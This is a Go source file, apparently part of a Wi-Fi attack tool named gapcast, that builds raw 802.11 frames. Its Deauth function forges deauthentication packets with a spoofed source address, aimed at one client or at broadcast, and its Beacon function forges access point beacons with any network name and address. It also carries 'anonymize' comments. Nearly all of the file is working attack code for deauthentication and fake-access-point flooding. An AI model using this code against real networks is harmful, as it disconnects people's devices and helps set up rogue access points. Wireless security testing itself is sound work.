package injpacket

import (
	"encoding/hex"
	radar "github.com/andrvv/gapcast/v1.0.3-beta/libs/RadarRSSI/libs"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"strings"
)

var (
	broadcast  []byte                  = []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	macToBytes func(mac string) []byte = func(mac string) []byte {
		macb, _ := hex.DecodeString(strings.ReplaceAll(mac, ":", ""))
		return macb
	}
)

// Craft De-Auth packet
func Deauth(source string, target string, seq int) (packet []gopacket.SerializableLayer) {
	var src []byte = macToBytes(source)
	var dst []byte
	if target == "" {
		dst = broadcast
	} else {
		dst = macToBytes(target)
	}
	return []gopacket.SerializableLayer{
		&layers.RadioTap{
			DBMAntennaSignal: int8(-10), // Anonymize RadioTap
		},
		&layers.Dot11{
			Address1:       dst,
			Address2:       src,
			Address3:       src,
			Type:           layers.Dot11TypeMgmtDeauthentication,
			SequenceNumber: uint16(seq),
		},
		&layers.Dot11MgmtDeauthentication{
			Reason: layers.Dot11ReasonClass2FromNonAuth,
		},
	}
}

// Craft Beacon packet
func Beacon(essid string, bssid string, channel int, seq int) (packet []gopacket.SerializableLayer) {
	var src []byte = macToBytes(bssid)
	return []gopacket.SerializableLayer{
		&layers.RadioTap{
			DBMAntennaSignal: int8(-10), // Anonymize RadioTap
			ChannelFrequency: layers.RadioTapChannelFrequency(radar.GetLinearFrequency(channel) / 1e6),
		},
		&layers.Dot11{
			Address1:       broadcast,
			Address2:       src,
			Address3:       src,
			Type:           layers.Dot11TypeMgmtBeacon,
			SequenceNumber: uint16(seq),
		},
		&layers.Dot11MgmtBeacon{
			Interval: 100,    // 100 TU, by default. Run with a delay of 102.4ms
			Flags:    0x1100, // ESS & Privacy
		},
		extra(layers.Dot11InformationElementIDSSID,
			[]byte(essid)),
		extra(layers.Dot11InformationElementIDDSSet,
			[]byte{byte(0xff & channel)}),
		extra(layers.Dot11InformationElementIDRates, // Support all 12 Rates (1, 2, 5.5, 6, 9, 11, 12, 18, 24, 36, 48, 54)
			[]byte{0x82, 0x84, 0x8b, 0x8c, 0x12, 0x96, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c}),
		extra(layers.Dot11InformationElementIDTIM, // TIM is used to recognize the beacon as a Access Point
			[]byte{0x04, 0x00, 0x01, 0x00, 0x00}),
		extra(layers.Dot11InformationElementIDRSNInfo, // RSN v1, TKIP - AES (WPA2)
			[]byte{0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x02, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00}),
	}
}

// Craft 802.11 Info layer
func extra(id layers.Dot11InformationElementID, data []byte) (infoElement *layers.Dot11InformationElement) {
	return &layers.Dot11InformationElement{
		ID:     id,
		Info:   data,
		Length: uint8(0xff & len(data)),
	}
}
